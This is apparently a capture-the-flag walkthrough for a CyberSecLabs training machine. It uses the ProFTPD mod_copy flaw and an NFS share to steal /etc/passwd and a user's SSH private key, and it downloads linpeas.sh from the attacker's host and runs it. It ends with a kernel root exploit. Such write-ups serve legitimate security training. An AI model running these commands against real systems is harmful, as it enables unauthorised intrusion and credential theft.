# CyberSecLabs : 172.31.1.22

Full Nmap Scan :

```zsh
nmap -sS -p- -r -v -T4 -Pn 172.31.1.22
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 09:22 EDT
Initiating Parallel DNS resolution of 1 host. at 09:22
Completed Parallel DNS resolution of 1 host. at 09:22, 0.01s elapsed
Initiating SYN Stealth Scan at 09:22
Scanning 172.31.1.22 [65535 ports]
Discovered open port 21/tcp on 172.31.1.22
Discovered open port 22/tcp on 172.31.1.22
Discovered open port 111/tcp on 172.31.1.22
Discovered open port 2049/tcp on 172.31.1.22
Increasing send delay for 172.31.1.22 from 0 to 5 due to 1120 out of 2799 dropped probes since last increase.
SYN Stealth Scan Timing: About 4.81% done; ETC: 09:33 (0:10:13 remaining)
SYN Stealth Scan Timing: About 8.51% done; ETC: 09:34 (0:10:56 remaining)
SYN Stealth Scan Timing: About 29.25% done; ETC: 09:36 (0:10:19 remaining)
SYN Stealth Scan Timing: About 33.45% done; ETC: 09:36 (0:09:29 remaining)
SYN Stealth Scan Timing: About 39.33% done; ETC: 09:36 (0:08:44 remaining)
SYN Stealth Scan Timing: About 45.26% done; ETC: 09:36 (0:08:00 remaining)
SYN Stealth Scan Timing: About 50.01% done; ETC: 09:36 (0:07:16 remaining)
Discovered open port 33837/tcp on 172.31.1.22
SYN Stealth Scan Timing: About 55.35% done; ETC: 09:36 (0:06:31 remaining)
Discovered open port 36807/tcp on 172.31.1.22
Discovered open port 36900/tcp on 172.31.1.22
Discovered open port 38139/tcp on 172.31.1.22
SYN Stealth Scan Timing: About 60.95% done; ETC: 09:37 (0:05:45 remaining)
Discovered open port 41668/tcp on 172.31.1.22
SYN Stealth Scan Timing: About 66.17% done; ETC: 09:37 (0:05:00 remaining)
SYN Stealth Scan Timing: About 70.93% done; ETC: 09:36 (0:04:15 remaining)
SYN Stealth Scan Timing: About 76.32% done; ETC: 09:37 (0:03:29 remaining)
SYN Stealth Scan Timing: About 81.53% done; ETC: 09:37 (0:02:45 remaining)
SYN Stealth Scan Timing: About 86.73% done; ETC: 09:37 (0:01:59 remaining)
SYN Stealth Scan Timing: About 91.85% done; ETC: 09:37 (0:01:14 remaining)
Completed SYN Stealth Scan at 09:37, 920.18s elapsed (65535 total ports)
Nmap scan report for 172.31.1.22
Host is up (0.19s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
111/tcp   open  rpcbind
2049/tcp  open  nfs
33837/tcp open  unknown
36807/tcp open  unknown
36900/tcp open  unknown
38139/tcp open  unknown
41668/tcp open  unknown

Read data files from: /usr/bin/../share/nmap

```
Service Scan :

```zsh
nmap -sC -sV -p 21,22,111,2049,33837,36807,38139,41668 172.31.1.22
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 09:58 EDT
Nmap scan report for 172.31.1.22
Host is up (0.16s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      ProFTPD 1.3.5
22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:6b:ae:92:45:a3:2d:d6:45:1c:ad:4f:37:23:4d:3b (DSA)
|   2048 24:4a:81:08:4b:cc:bb:a7:c9:da:3b:17:39:ad:a0:61 (RSA)
|_  256 0c:2b:07:32:18:8c:1a:86:e3:fa:c4:09:de:f5:0f:a0 (ECDSA)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33837/tcp   mountd
|   100005  1,2,3      34883/udp   mountd
|   100005  1,2,3      37514/tcp6  mountd
|   100005  1,2,3      42096/udp6  mountd
|   100021  1,3,4      38139/tcp   nlockmgr
|   100021  1,3,4      40709/tcp6  nlockmgr
|   100021  1,3,4      41784/udp6  nlockmgr
|   100021  1,3,4      52816/udp   nlockmgr
|   100024  1          35320/udp   status
|   100024  1          38767/udp6  status
|   100024  1          41668/tcp   status
|   100024  1          53959/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  2-3 (RPC #100227)
33837/tcp open  mountd   1-3 (RPC #100005)
36807/tcp open  mountd   1-3 (RPC #100005)
38139/tcp open  nlockmgr 1-4 (RPC #100021)
41668/tcp open  status   1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.72 seconds
```

You can google about the ```ProFTPD 1.3.5``` which is vulnerable to modcopy vulnerability. 

What happens is you can login into ftp with anonymous creds, it will show failed but you still get the ftp prompt and can put commands

You can searchsploit and read it ```linux/remote/36742.txt``` 
After reading the exploit I can understand that I can copy files from one place to another. But how do I access the files ? Well we have an nsfshare (port 2049) which can be used. 

To view what share is available to mount:

```zsh
showmount -e 172.31.1.22
```
Now to mount the share make a new directory in /mnt and try this:

```zsh
mount -t nfs  172.31.1.22:/var/nfsbackups/ /mnt/outdated -o nolock
```
You will see there are 3 usernames and they are empty.

Unmount it : ```umount /mnt/cslshare```

In the ftp prompt type this ```cpfr /etc/passwd``` and copy it to ```cpto /var/nsfbackups/passwd```

Now remount and read the file. You can see the username is daniel. You can unmount it again.

Now we can steal .ssh file of daniel using the same method used above 

In the ftp prompt:
```cpfr /home/daniel/.ssh/id_rsa``` then copy transfer to the share ```cpto /var/nsfbackups/id_rsa```

Now remount the share and copy the file to in your working directory. Give it proper permissions : ```chmod 400 id_rsa``` and then try to ssh

```zsh
ssh -i id_rsa daniel@172.31.1.22
```

Now you will have a user shell as daniel. 

For privesc, simply upload linpeas.sh using wget.

Host a python server where linpeas in located on your PC

```zsh
python -m SimpleHTTPServer 8000
```
Now on the ssh shell go the /tmp/ directory and ```wget http://10.10.0.40/linpeas.sh``` and ```bash linpeas.sh```

You will notice it will highlight the kernel. Simply google for that kernel version exploit and you will land on this :
https://www.exploit-db.com/exploits/37292

Simply compile the code using ```gcc ofs.c -o ofs``` on your machine and transfer it to the target and then ```chmod 777 ofs```for proper permissions ```./ofs``` which will spawn a root shell.